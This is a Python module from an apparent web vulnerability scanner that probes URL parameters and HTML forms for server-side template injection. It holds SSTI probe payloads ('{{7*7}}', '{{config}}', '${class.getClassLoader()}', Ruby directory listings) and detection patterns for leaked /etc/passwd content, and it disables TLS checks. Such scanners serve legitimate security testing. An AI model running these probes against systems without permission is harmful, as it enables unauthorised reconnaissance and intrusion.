import requests
import random
from parametizer.bounded_pool import run_threadpool_pending_bounded
from urllib.parse import urlparse, parse_qs, urljoin, quote
from bs4 import BeautifulSoup
from colorama import init, ansi
from parametizer.progress import update_progress, print_vulnerability
from parametizer.core.headers import get_headers
import urllib3
import threading
import sys
import os
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from vulnerability_manager import vuln_manager

init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def is_ssti_response(text, payload=None):
    """
    Función ULTRA ESTRICTA para detectar SOLO vulnerabilidades SSTI REALES
    """
    if not isinstance(text, str) or len(text.strip()) == 0:
        return False
    
    # Normalizar una sola vez
    lowered_text = text.lower()
    
    # EXCLUSIONES INMEDIATAS - Si contiene estos, NO es SSTI
    exclusion_patterns = [
        # Errores de SQL
        "sql syntax", "mysql", "unknown column", "where clause", "check the manual",
        "you have an error in your sql syntax", "error in your sql",
        # Errores de sintaxis general
        "syntax error", "parse error", "compilation error",
        # Respuestas HTML estáticas comunes
        "tumblr", "facebook", "twitter", "instagram", "youtube", "google",
        # Errores de servidor web
        "apache", "nginx", "iis", "server error", "internal server error",
        # Errores de aplicación
        "application error", "runtime error", "fatal error"
    ]
    
    # Si contiene cualquier patrón de exclusión, NO es SSTI
    if any(pattern in lowered_text for pattern in exclusion_patterns):
        return False
    
    # EXCLUSIONES POR CONTEXTO - Si es HTML estático, NO es SSTI
    html_static_indicators = [
        "<!doctype html>", "<html", "<head>", "<body>", "<meta", "<script",
        "tumblr.com", "assets.tumblr.com", "static.tumblr.com"
    ]
    
    # Si es claramente HTML estático de Tumblr, NO es SSTI
    if any(indicator in lowered_text for indicator in html_static_indicators):
        return False
    
    # EVIDENCIA FUERTE 1: Resultados matemáticos específicos de SSTI
    # Solo aceptar si están en contexto apropiado (no en URLs o metadatos)
    math_results = ["49", "14", "21", "28", "35", "42", "56", "63", "70", "77", "84", "91", "98"]
    for result in math_results:
        if result in text:
            # Verificar que no esté en una URL o metadato
            if not any(url_indicator in lowered_text for url_indicator in ["http://", "https://", "url=", "src="]):
                return True
    
    # EVIDENCIA FUERTE 2: Contenido de archivos del sistema real
    system_file_indicators = [
        "root:x:0:0:", "bin:x:1:1:", "daemon:x:2:2:", "sys:x:3:3:",
        "total ", "drwxr-xr-x", "-rw-r--r--", "lrwxrwxrwx",
        "proc/", "sys/", "dev/", "etc/", "var/", "usr/", "home/"
    ]
    
    for indicator in system_file_indicators:
        if indicator in text:
            # Verificar que no esté en una URL o metadato
            if not any(url_indicator in lowered_text for url_indicator in ["http://", "https://", "url=", "src="]):
                return True
    
    # EVIDENCIA MEDIA: Errores específicos de motores de template
    # Solo si NO hay errores de SQL y está en contexto apropiado
    engine_error_indicators = [
        "jinja2.exceptions", "templatesyntaxerror", "undefinederror",
        "twig.error", "freemarker.core", "templateexception",
        "org.apache.velocity", "velocityexception", "mako.exceptions",
        "thymeleaf", "pebble", "mustache", "handlebars"
    ]
    
    for indicator in engine_error_indicators:
        if indicator in lowered_text:
            # Verificar que no sea un error de SQL disfrazado
            if "sql" not in lowered_text and "mysql" not in lowered_text:
                # Verificar que no esté en una URL o metadato
                if not any(url_indicator in lowered_text for url_indicator in ["http://", "https://", "url=", "src="]):
                    return True
    
    # EVIDENCIA DÉBIL: Reflexión de payload con contexto
    # Solo si hay evidencia de que se está procesando como template
    if payload:
        try:
            from urllib.parse import quote, unquote
            payload_variants = set([
                payload,
                payload.strip(),
                quote(payload, safe=''),
                unquote(payload),
            ])
        except Exception:
            payload_variants = set([payload, payload.strip()])
        
        # Verificar si el payload se refleja
        payload_reflected = any(variant in text for variant in payload_variants)
        
        if payload_reflected:
            # Indicadores de que se está procesando como template
            template_processing_indicators = [
                "template", "render", "compile", "parse", "execute",
                "jinja", "twig", "freemarker", "velocity", "mako"
            ]
            
            # Si hay indicadores de procesamiento de template, podría ser SSTI
            if any(indicator in lowered_text for indicator in template_processing_indicators):
                return True
            
            # Si NO hay indicadores de procesamiento de template, es solo reflexión
            return False
    
    # VERIFICACIÓN FINAL: Solo retornar True si hay evidencia fuerte
    # Si no hay resultados matemáticos, contenido de archivos del sistema, 
    # o errores de template en contexto apropiado, NO es SSTI
    return False

def ssti(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, random_agent=False, strict_mode=True):
    sys.stdout.write('\033[1;36m<<<<<<<<<<<<\033[0m Testing SSTI Injection \033[1;36m>>>>>>>>>>>>>>\033[0m\n')
    print()
    sys.stdout.flush()

    total_tasks = (len(urip) * 2 + len(urif)) * len(wordlist)
    current = 0
    lock = threading.Lock()
    vulnerable_endpoints = set()
    
    # Cache para baselines y endpoints vulnerables
    baseline_cache = {}
    form_cache = {}
    stdout_lock = threading.Lock()
    
    # Payloads de verificación OBLIGATORIOS para confirmar SSTI real
    verification_payloads = [
        "{{7*7}}",      # Jinja2/Twig - debe devolver 49
        "${7*7}",       # Freemarker - debe devolver 49
        "#{7*7}",       # Ruby ERB - debe devolver 49
        "<%=7*7%>",     # PHP/ASP - debe devolver 49
        "{7*7}",        # Handlebars - debe devolver 49
        "{{7*7}}",      # Mustache - debe devolver 49
    ]
    
    # Payloads de verificación adicionales para diferentes motores
    file_read_payloads = [
        "{{config}}",           # Jinja2 config
        "${class.getClassLoader()}",  # Freemarker
        "#{Dir.entries('/')}",  # Ruby ERB
        "<%=Dir.entries('/')%>", # PHP/ASP
    ]
    
    def verify_ssti_vulnerability(base_url, param, method, headers, payload):
        """
        Verificar que una vulnerabilidad SSTI sea REAL usando múltiples payloads
        """
        verification_count = 0
        successful_payloads = []
        
        # Probar múltiples payloads de verificación
        for verify_payload in verification_payloads[:4]:  # Probar los primeros 4
            try:
                if method == "get":
                    verify_r = requests.get(base_url, params={param: verify_payload}, headers=headers, verify=False, timeout=5)
                else:
                    verify_r = requests.post(base_url, data={param: verify_payload}, headers=headers, verify=False, timeout=5)
                
                if verify_r.status_code == 200 and is_ssti_response(verify_r.text, verify_payload):
                    verification_count += 1
                    successful_payloads.append(verify_payload)
                    
                    # Si ya tenemos 2 confirmaciones, es suficiente
                    if verification_count >= 2:
                        break
                        
            except:
                continue
        
        # Solo considerar vulnerable si al menos 2 payloads funcionan
        return verification_count >= 2, successful_payloads
    

    def get_baseline_response(method, url, data=None):      
        try:
            # Solo hacer request si hay datos, sino retornar string vacío
            if not data:
                return ""
                
            headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
            if method == "post":
                r = requests.post(url, data={k: "TEST123" for k in data}, headers=headers, verify=False, timeout=5)
            elif method == "get":
                r = requests.get(url, params={k: "TEST123" for k in data}, headers=headers, verify=False, timeout=5)
            else:
                return ""
            
            # Solo retornar texto si la respuesta es exitosa
            if r.status_code == 200:
                return r.text.lower()
            return ""
        except requests.exceptions.Timeout:
            return ""  # Timeout específico
        except requests.exceptions.RequestException:
            return ""  # Otros errores de requests
        except Exception:
            return ""  # Cualquier otro error

    def test_url(url, payload):
        nonlocal current
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = parse_qs(parsed.query)

        if not qs:
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        # Verificar si ya se explotó esta URL usando el sistema unificado
        if vuln_manager.should_skip_url(base_url, base_url_only=True):
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        for param in qs:
            # Verificar si ya se explotó esta combinación específica
            if vuln_manager.should_skip_url(base_url, param):
                with lock:
                    current += 1
                    update_progress(current, total_tasks)
                return
                
            # Cache de baseline para GET
            baseline_key = f"GET-{base_url}-{param}"
            if baseline_key not in baseline_cache:
                baseline_cache[baseline_key] = get_baseline_response("get", base_url, {param: "TEST123"})
            baseline = baseline_cache[baseline_key]
            
            # Verificar si el parámetro se refleja
            if not baseline or "test123" not in baseline:
                continue

            # Ahora prueba con payload SSTI
            headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
            try:
                r = requests.get(base_url, params={param: payload}, headers=headers, verify=False, timeout=5)
                
                # Solo procesar si la respuesta es exitosa
                if r.status_code == 200 and is_ssti_response(r.text, payload) and r.text.lower() != baseline:
                    # Verificación OBLIGATORIA con múltiples payloads
                    is_vulnerable, successful_payloads = verify_ssti_vulnerability(base_url, param, "get", headers, payload)
                    
                    if not is_vulnerable:
                        continue  # No es vulnerable - falsos positivos filtrados
                    
                    # Verificar si ya se explotó esta combinación específica
                    if not vuln_manager.is_already_exploited(base_url, param):
                        # Verificar falso positivo
                        if not vuln_manager.verify_false_positive(base_url, payload, "GET", custom_headers, random_agent):
                            # Marcar como explotada
                            vuln_manager.mark_as_exploited(base_url, param)
                            vuln_manager.mark_as_exploited(base_url, base_url_only=True)
                            
                            # Salida sincronizada usando la nueva función
                            with stdout_lock:
                                encoded = quote(payload, safe='')
                                print_vulnerability(f"\033[1;32m[GET][VULNERABLE]\033[0m {base_url}?{param}={encoded}")
                            
                            urls_vulnerables.append(f"{base_url}?{param}={encoded}")
                    break
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue
                
        with lock:
            current += 1
            update_progress(current, total_tasks)

    def test_post(url, payload):
        nonlocal current
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = parse_qs(parsed.query)

        if base_url in vulnerable_endpoints or not qs:
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        for param in qs:
            # Cache de baseline para POST
            baseline_key = f"POST-{base_url}-{param}"
            if baseline_key not in baseline_cache:
                baseline_cache[baseline_key] = get_baseline_response("post", base_url, {param: "TEST123"})
            baseline = baseline_cache[baseline_key]
            
            # Verificar si el parámetro se refleja
            if not baseline or "test123" not in baseline:
                continue

            # Prueba payload SSTI
            headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
            try:
                r = requests.post(base_url, data={param: payload}, headers=headers, verify=False, timeout=5)
                
                # Solo procesar si la respuesta es exitosa
                if r.status_code == 200 and is_ssti_response(r.text, payload) and r.text.lower() != baseline:
                    # Verificación OBLIGATORIA con múltiples payloads
                    is_vulnerable, successful_payloads = verify_ssti_vulnerability(base_url, param, "post", headers, payload)
                    
                    if not is_vulnerable:
                        continue  # No es vulnerable - falsos positivos filtrados
                    
                    with lock:
                        if base_url not in vulnerable_endpoints:
                            vulnerable_endpoints.add(base_url)
                            
                            # Salida sincronizada usando la nueva función
                            with stdout_lock:
                                encoded = quote(payload, safe='')
                                print_vulnerability(f"\033[1;32m[POST][VULNERABLE]\033[0m {base_url}?{param}={encoded}")
                            
                            urls_vulnerables.append(f"{base_url}?{param}={encoded}")
                    break
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue
                
        with lock:
            current += 1
            update_progress(current, total_tasks)

    def test_form(url, payload):
        nonlocal current
        headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
        try:
            # Cache de formularios para evitar re-parsing
            if url not in form_cache:
                r = requests.get(url, headers=headers, timeout=7)
                soup = BeautifulSoup(r.text, "html.parser")
                forms = soup.find_all("form")
                form_cache[url] = forms
            else:
                forms = form_cache[url]
                
            for form in forms:
                action = form.get("action")
                method = form.get("method", "get").lower()
                inputs = form.find_all("input")
                data = {}
                for i in inputs:
                    name = i.get("name")
                    if name:
                        # Prueba con TEST123 antes de SSTI
                        data[name] = "TEST123"

                if not data:
                    continue

                full_url = urljoin(url, action) if action else url
                
                # Cache de baseline para formularios
                baseline_key = f"{method}-{full_url}-{','.join(data.keys())}"
                if baseline_key not in baseline_cache:
                    baseline_cache[baseline_key] = get_baseline_response(method, full_url, data)
                baseline = baseline_cache[baseline_key]
                
                # Verificar si TEST123 se refleja
                if not baseline or "test123" not in baseline:
                    continue

                # Cambiar a payload real
                data = {k: payload for k in data.keys()}
                
                if method == "post":
                    res = requests.post(full_url, data=data, headers=headers, timeout=5)
                else:
                    res = requests.get(full_url, params=data, headers=headers, timeout=5)

                # Solo procesar si la respuesta es exitosa
                if res.status_code == 200 and is_ssti_response(res.text, payload) and res.text.lower() != baseline:
                    # Verificación OBLIGATORIA con múltiples payloads
                    # Para formularios, usar el primer parámetro para la verificación
                    first_param = list(data.keys())[0] if data else None
                    if first_param:
                        is_vulnerable, successful_payloads = verify_ssti_vulnerability(full_url, first_param, method, headers, payload)
                        
                        if not is_vulnerable:
                            continue  # No es vulnerable - falsos positivos filtrados
                    
                    with lock:
                        if full_url not in vulnerable_endpoints:
                            vulnerable_endpoints.add(full_url)
                            
                            # Salida sincronizada usando la nueva función
                            with stdout_lock:
                                encoded_data = {k: quote(v, safe='') for k, v in data.items()}
                                print_vulnerability(f"\033[1;32m[FORM][VULNERABLE]\033[0m {full_url}\n{encoded_data}")
                            
                            urls_vulnerables.append(f"{full_url}")
        except requests.exceptions.Timeout:
            pass  # Skip timeouts silently
        except requests.exceptions.RequestException:
            pass  # Skip other request errors
        except Exception:
            pass  # Skip any other errors
            
        with lock:
            current += 1
            update_progress(current, total_tasks)

    # Crear tareas de manera más eficiente
    def _iter_ssti_tasks():
        for url in urip:
            for payload in wordlist:
                yield (test_url, url, payload)
                yield (test_post, url, payload)
        for url in urif:
            for payload in wordlist:
                yield (test_form, url, payload)

    run_threadpool_pending_bounded(_iter_ssti_tasks(), threads)

    # Limpiar salida final
    with stdout_lock:
        sys.stdout.write('\r' + ansi.clear_line())
        sys.stdout.flush()
    print()
    if vulnerable_endpoints:
        sys.stdout.write(f'\033[1;36m[+] Found {len(vulnerable_endpoints)} potential SSTI vulnerabilities\033[0m\n')
        sys.stdout.flush()
    else:
        sys.stdout.write('\033[1;31m[-] No SSTI vulnerabilities found\033[0m\n')
        sys.stdout.flush()
    print()
    
    return urls_vulnerables
